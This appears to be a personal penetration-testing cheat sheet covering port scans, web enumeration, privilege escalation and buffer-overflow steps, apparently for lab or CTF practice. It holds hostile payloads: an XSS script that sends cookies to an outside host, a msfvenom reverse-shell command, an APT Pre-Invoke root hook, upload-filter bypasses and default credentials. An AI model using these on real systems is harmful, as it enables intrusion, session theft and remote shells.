(Soon will be moved to my [gitbook](https://pentest-henryzhefeng.gitbook.io/hacktheplanet/))
# Philosophy
- first, test the potential vuln (or each step of it) by minimum cost

# Port Scan
- `nmap -sC -sV -oA <name> <ip>`
- `nmap -p- -sV <ip> > all-tcp`
- `nmap -sU <ip> > comm-udp`
- `nmap --script vuln <ip>`
- `nc -zv xx.xx.xx.xx 1-100 2>&1 | grep -v "refused"`

# HTTP/HTTPS 80/443
- `gobuster -u http://xxxxx -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html`
  - remember to recursively scan if needed
- google its software version and find its exploit
- login page => google its default cred
- play around and see whether there is any upload/execute vuln
- check its ssl cert information, it may contain some username or email
- play with PHPSESSID, reuse it, to see what happens

# DNS
https://gist.github.com/feng-zhe/fc78b1f01b6ce6c26dd7a6ebc909953d

## SQLi
https://gist.github.com/feng-zhe/e75d0c2c918c9edf50b27eb4d489b15f

## PHP Wrapper
https://gist.github.com/feng-zhe/e6bc151aa96132b3cc4e03b5a858e80c

## PHP cmd and file upload script
https://gist.github.com/feng-zhe/68efdd66fd20fd4626fe82e3f92d6e2b

# SMB
https://gist.github.com/feng-zhe/3f7c802df4b47bc9d70eeb8bdbd190e8

# SNMP udp/161
- `snmpwalk -c public -v1 <target>`
- `snmp-check -w -t 30 <target>`

# Priv Esc
## Linux
- go to /var/www/, read config => get db cred => extract juicy info
- password reuse
- find SUID files => `find / -perm -4000 2>/dev/null`
- find all files in /home => `find /home -type f`
- LinEnum.sh, linux-exploit-suggester.sh, linuxprivchecker.py
## Windows
- [ps scripts](https://gist.github.com/feng-zhe/b47e251d9cc5d9bdf6504de182b1b2e0)
- [manually enum](https://gist.github.com/feng-zhe/7913c7cc5b11f23cf99db058bb9edb00)
- [runas attack](https://gist.github.com/feng-zhe/0e6d4dfd75d248d6450658618458d579)
- [service replace](https://gist.github.com/feng-zhe/fc00f38428bb8974ed8ced67879ed374)
- If using MSF, try to migrate to a x64 process and run local\_exploit\_suggest.

# Manually Test User Pass
- admin:admin
- admin:password
- admin:Password1
- guest:guest

# File 
- exitfool xx => find hidden info, like author, email

# File Transfer
- smb share
  - (kali) `impacket-smbserver share <shared path>`
  - (windows) `net use z: \\<kali's ip>\share`
  - (windows) `copy <file\ z:`

# gdb (with peda)
- `r < <(python exp.py)`
  - (or 'set args' if take parameters)
- `r < input.txt`
- `readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit`
- `strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'`
- `p system` => address of function system
- `info functions` => list all functions
- `vmmap` => find which part is executable.

# binary exploit steps (with immunity dbg)
1. find EIP overflow offset
    1. `msf-pattern_create -l 300`
    1. `msf-pattern_offset -q <value>`
1. test bad chars
1. `!mona modules`
    1. see modules and their security flags. we also need to make sure the module address doesn't contain bad chars.
1. click the "e" button to see the list of executable modules. Double click on one to view its assembly code.
1. find "jmp esp" commands
    1. right click -> search for -> command, then enter "jmp esp"(or others).
    1. right click -> search for -> sequence of commands, then enter "push esp", new line, "ret".
    1. if no DEP is enabled, we can search beyond the .text section where the "search for" commands focus. We can search other sections.
        1. `msf-nasm_shell` and enter "jmp esp", it says "FFE4"
        2. `!mona find -s "\xff\xe4" -m xxx.dll
        3. you can click the button "->|" (except the | are dots)
1. place shellcode
    1. `msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai`

# Oracle DB exploit tool
- odat.py
  - `--sysdba` to get a 
  
# XSS
```
<script>
document.write('<img src="http://10.10.14.19/xxxx?cookie=' + document.cookie + '" />')
</script>
```

# bypass upload file filter
- jpg.php, php.jpg, php5, php6, php7
- use system filename length limits to truncate the .png part from .php.png

# escaping black list
- /usr/bin/find replaced by /usr/bin/fin? or /usr/bin/\f\i\n\d

# APT pre-invoke attack
If apt update is run, the scripts in /etc/apt/apt.conf.d/ also gets run.
So, if there is a job running apt update, we can put a file with following content under /etc/apt/apt.conf.d/:
`APT::Update::Pre-Invoke {"/bin/bash /tmp/myshell.sh"}`

# Powershell
https://gist.github.com/feng-zhe/5429965db99d9647ffc60bb571c6f46e

# Escape rbash
https://gist.github.com/feng-zhe/ffc2063f138a4321c3cb45c9fdab5e46

# Resources
- [omniscient methods](http://www.0daysecurity.com/penetration-testing/enumeration.html)
- [bypass file upload filter](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
